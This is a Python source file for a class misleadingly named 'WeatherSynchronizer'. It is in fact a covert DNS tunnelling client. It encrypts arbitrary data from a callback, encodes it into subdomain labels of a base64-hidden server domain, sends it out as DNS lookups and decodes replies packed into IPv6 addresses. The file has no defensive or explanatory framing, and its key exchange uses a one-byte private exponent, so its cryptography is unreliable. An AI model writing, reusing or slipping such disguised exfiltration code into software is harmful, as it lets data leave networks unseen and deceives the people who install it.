from __future__ import annotations

import base64
import binascii
import json
import os
import random
import socket
import string
from ipaddress import IPv6Address
from typing import Any, Callable, Dict, List

from shared.aes import encypt_message
from shared.ip_codec import FILL_CHAR, decode_ip, deobfuscate_packet_ordinal
from shared.utils import calc_public_key, decode_query, encode_query, int_to_bytes

MSG_SIZE = 50
NON_DATA_PREAMBLE = "ph"


class WeatherSynchronizer:
    g = 2
    p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74
    a = ord(os.urandom(1))
    iv = os.urandom(16)

    def __init__(
        self,
        data_factory: Callable[[], Dict[str, Any]],
        servers: list[str] = ["ZXhhbXBsZS5vcmc="],
    ) -> None:
        self.servers: Dict[str, Dict[str, Any]] = dict(
            zip(servers, [{"session": self.generate_session_code()} for _ in servers])
        )
        self.factory = data_factory

    def prepare_data_message(
        self,
        _typecode: int,
        _message: bytes,
    ) -> bytes:
        typecode = str(_typecode).encode()
        message = typecode + b"|" + _message
        return encode_query(message)

    @staticmethod
    def split_to_packets(message: bytes) -> List[bytes]:
        """
        Split a message into a list of packets.
        """
        packets = [
            b"%s" % message[i : i + MSG_SIZE]  # noqa: SFS102
            for i in range(0, len(message), MSG_SIZE)
        ]
        if len(packets) > 16:
            return []

        return packets

    @staticmethod
    def form_dns_queries(
        packets: List[bytes],
        domain: str,
        is_data: bool,
        session_code: str,
        stream_code: str,
    ) -> List[str]:

        total_packets = len(packets)
        messages = []

        for i in range(total_packets):
            packet = packets[i]
            if is_data:
                seq = hex(15 - i)[2:]
                total_pkts = hex(15 - total_packets)[2:]

            else:
                seq = chr(ord(NON_DATA_PREAMBLE[0]) + i)
                total_pkts = chr(ord(NON_DATA_PREAMBLE[1]) + total_packets)

            try:
                outbound = seq + total_pkts + packet.decode()
            except UnicodeDecodeError:
                continue

            try:
                outbound = (
                    outbound
                    + "."
                    + stream_code
                    + "."
                    + session_code
                    + "."
                    + base64.b64decode(domain).decode()
                )

            except (binascii.Error, UnicodeDecodeError, ValueError):
                continue

            messages.append(outbound)
        return messages

    @staticmethod
    def send_dns_queries(queries: List[str]) -> List[List[IPv6Address]]:
        answers = []
        for _, query in enumerate(queries):
            try:
                responses = socket.getaddrinfo(
                    query,
                    None,
                    socket.AF_INET6,
                    socket.SOCK_DGRAM,
                )

                addresses = [r[4][0] for r in responses]
                answers.append(addresses)
            except Exception:
                break

        return answers

    def build_public_key(self) -> int:
        return calc_public_key(self.g, self.a, self.p)

    @staticmethod
    def iv_from_bytes(iv: bytes) -> int:
        return int.from_bytes(iv, "big")

    def build_dhe_init_packet(self, iv: bytes) -> bytes:
        return encode_query(
            json.dumps(
                {
                    "B": self.build_public_key(),
                    "iv": self.iv_from_bytes(iv),
                }
            ).encode()
        )

    def message2queries(
        self,
        session_code: str,
        stream_code: str,
        domain: str,
        message: bytes,
        as_data: bool,
    ) -> List[str]:
        packets = self.split_to_packets(message)
        return self.form_dns_queries(
            packets,
            domain,
            as_data,
            session_code,
            stream_code,
        )

    def build_data_message(
        self,
        session_code: str,
        stream_code: str,
        domain: str,
        typecode: int,
        message: str,
    ) -> List[str]:
        if domain not in self.servers:
            return []

        if not session_code or not stream_code:
            return []

        key = self.servers[domain].get("key")
        if not key:
            self.init_server(domain)

        key = self.servers[domain].get("key")
        if not key:
            return []

        keypair = int_to_bytes(key), self.iv
        encrypted_message = encypt_message(message.encode(), *keypair)
        encoded_message = self.prepare_data_message(typecode, encrypted_message)

        return self.message2queries(
            session_code,
            stream_code,
            domain,
            encoded_message,
            True,
        )

    @staticmethod
    def sort_packets(packets: List[bytes]) -> List[bytes]:
        if any(deobfuscate_packet_ordinal(p) < 0 for p in packets):
            return []
        sorts = [
            packet.rstrip(FILL_CHAR)[:-1]
            for packet in sorted(packets, key=lambda p: deobfuscate_packet_ordinal(p))
        ]

        return sorts

    def depacketize(self, packets: List[bytes]) -> bytes:
        response = b""
        for packet in self.sort_packets(packets):
            response += packet
        return response

    def resolve_server_answer(self, packets: List[IPv6Address]) -> bytes:
        decoded = [decode_ip(packet) for packet in packets]
        message = self.depacketize(decoded)

        return decode_query(message)

    def resolve_server_public_key(self, public_key: int) -> int:
        return pow(public_key, self.a, self.p)

    def packetize_dhe_init(self, domain: str, sesion_code: str, stream_code: str) -> List[str]:
        encoded_message = self.build_dhe_init_packet(self.iv)
        return self.message2queries(
            sesion_code,
            stream_code,
            domain,
            encoded_message,
            False,
        )

    def init_server(self, server_domain: str):
        if not server_domain or server_domain not in self.servers:
            return

        stream_code = self.generate_stream_code()
        answers = self.send_dns_queries(
            self.packetize_dhe_init(
                server_domain, self.servers[server_domain]["session"], stream_code
            )
        )

        self.parse_server_key_answer(server_domain, answers)

    def parse_server_key_answer(self, server_domain, answers):
        if not answers:
            return

        self.servers[server_domain]["key"] = self.resolve_server_public_key(
            int.from_bytes(self.resolve_server_answer(answers[-1]), "big")
        )

    def send_dhe_init(self):
        for server in self.servers:
            self.init_server(server)

    @staticmethod
    def generate_session_code() -> str:
        return base64.b16encode(os.urandom(2)).lower().decode()

    @staticmethod
    def generate_stream_code() -> str:
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(2))

    def send_data_message(self):
        stream_code = self.generate_stream_code()
        message = json.dumps(self.factory())

        for server, params in self.servers.items():
            if "session" not in params or "key" not in params:
                self.init_server(server)

            queries = self.build_data_message(params["session"], stream_code, server, 0, message)
            self.send_dns_queries(queries)
